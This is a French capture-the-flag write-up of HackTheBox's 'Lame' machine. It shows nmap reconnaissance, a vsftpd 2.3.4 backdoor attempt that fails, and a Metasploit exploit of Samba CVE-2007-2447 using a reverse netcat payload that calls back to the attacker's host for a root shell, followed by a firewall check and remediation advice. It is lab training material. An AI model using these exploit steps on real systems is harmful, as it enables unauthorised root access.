# Lame - HackTheBox Writeup

![HTB Lame](https://img.shields.io/badge/HackTheBox-Lame-green)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)

## Box Info

| Property | Value |
|----------|-------|
| Name | Lame |
| OS | Linux (Ubuntu) |
| Difficulty | Easy |
| Release | 2017 |
| IP | 10.129.30.106 |

## Flags

| Flag | Location |
|------|----------|
| User | `/home/makis/user.txt` |
| Root | `/root/root.txt` |

---

## Summary

1. **Recon** : 4 ports ouverts (FTP, SSH, SMB 139/445)
2. **Rabbit Hole** : vsftpd 2.3.4 backdoor bloqué par firewall
3. **Exploitation** : Samba 3.0.20 usermap_script (CVE-2007-2447) → shell root direct
4. **Bonus** : Investigation du firewall bloquant le backdoor vsftpd

---

## Reconnaissance

### Nmap Scan

```bash
nmap -T4 -A 10.129.30.106
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

**4 ports ouverts** : FTP (21), SSH (22), SMB (139, 445)

### Services identifiés

| Service | Version | Notes |
|---------|---------|-------|
| vsftpd | 2.3.4 | Anonymous login, backdoor connu |
| OpenSSH | 4.7p1 | Ancienne version |
| Samba | 3.0.20 | Vulnérable à CVE-2007-2447 |

### SMB Enumeration

```bash
nmap -p 139,445 --script="smb-vuln*" 10.129.30.106
```

```
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
```

---

## Exploitation

### Tentative 1 : vsftpd 2.3.4 Backdoor (Échec)

vsftpd 2.3.4 contient un backdoor célèbre qui ouvre le port 6200 quand on envoie `:)` dans le username.

```bash
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf > set RHOSTS 10.129.30.106
msf > exploit
[*] Exploit completed, but no session was created.
```

**Résultat** : Le backdoor se déclenche (port 6200 s'ouvre) mais le firewall bloque la connexion.

### Tentative 2 : Samba usermap_script (Succès)

Samba 3.0.20 est vulnérable à **CVE-2007-2447** : injection de commandes via le champ username.

```bash
msf > use exploit/multi/samba/usermap_script
msf > set RHOSTS 10.129.30.106
msf > set PAYLOAD cmd/unix/reverse_netcat
msf > set LHOST 10.10.14.197
msf > set LPORT 4445
msf > exploit
```

```
[*] Started reverse TCP handler on 10.10.14.197:4445
[*] Command shell session 1 opened (10.10.14.197:4445 -> 10.129.30.106:37763)
```

### Shell obtenu

```bash
whoami
root

cat /home/makis/user.txt
[REDACTED]

cat /root/root.txt
[REDACTED]
```

**Note** : L'exploit Samba donne directement un shell root, pas besoin de privilege escalation.

---

## Bonus : Investigation du Firewall

### Pourquoi vsftpd backdoor échoue ?

Avec un shell root, on peut investiguer pourquoi le backdoor vsftpd ne fonctionnait pas.

```bash
iptables -L -n -v
```

```
Chain INPUT (policy DROP)
...
Chain ufw-user-input (1 references)
   ACCEPT tcp  --  *  *  0.0.0.0/0  0.0.0.0/0  tcp dpt:21
   ACCEPT tcp  --  *  *  0.0.0.0/0  0.0.0.0/0  tcp dpt:22
   ACCEPT tcp  --  *  *  0.0.0.0/0  0.0.0.0/0  tcp dpt:139
   ACCEPT tcp  --  *  *  0.0.0.0/0  0.0.0.0/0  tcp dpt:445
```

**UFW (Uncomplicated Firewall)** est configuré avec une policy DROP par défaut. Seuls les ports 21, 22, 139, 445 sont autorisés.

Le port **6200** (ouvert par le backdoor vsftpd) n'est pas dans la liste → connexion bloquée.

---

## Résumé de l'attaque

```
┌─────────────────┐                           ┌─────────────────┐
│   Attaquant     │                           │      Lame       │
│  10.10.14.197   │                           │  10.129.30.106  │
└────────┬────────┘                           └────────┬────────┘
         │                                             │
         │  1. Nmap scan                               │
         │────────────────────────────────────────────►│
         │  Découverte: vsftpd 2.3.4, Samba 3.0.20    │
         │◄────────────────────────────────────────────│
         │                                             │
         │  2. vsftpd backdoor (BLOCKED by firewall)  │
         │──────────────────────X                      │
         │                                             │
         │  3. Samba usermap_script (CVE-2007-2447)   │
         │────────────────────────────────────────────►│
         │                                             │
         │  4. Reverse shell (root)                    │
         │◄────────────────────────────────────────────│
         │                                             │
         ▼                                             ▼
    User + Root flags
```

---

## Lessons Learned

| Vulnerability | Description | Remediation |
|---------------|-------------|-------------|
| **Samba CVE-2007-2447** | Injection de commandes via username | Mettre à jour Samba > 3.0.25 |
| **vsftpd 2.3.4 Backdoor** | Backdoor dans le code source officiel | Mettre à jour vsftpd |
| **Services obsolètes** | Versions très anciennes des services | Maintenir les systèmes à jour |
| **Firewall insuffisant** | Bloque vsftpd backdoor mais pas Samba | Defense in depth |

---

## Outils utilisés

- nmap
- Metasploit (exploit/multi/samba/usermap_script)

---

## Références

- [CVE-2007-2447 - Samba usermap_script](https://www.cvedetails.com/cve/CVE-2007-2447/)
- [vsftpd 2.3.4 Backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- [0xdf Lame Writeup](https://0xdf.gitlab.io/2020/04/07/htb-lame.html)
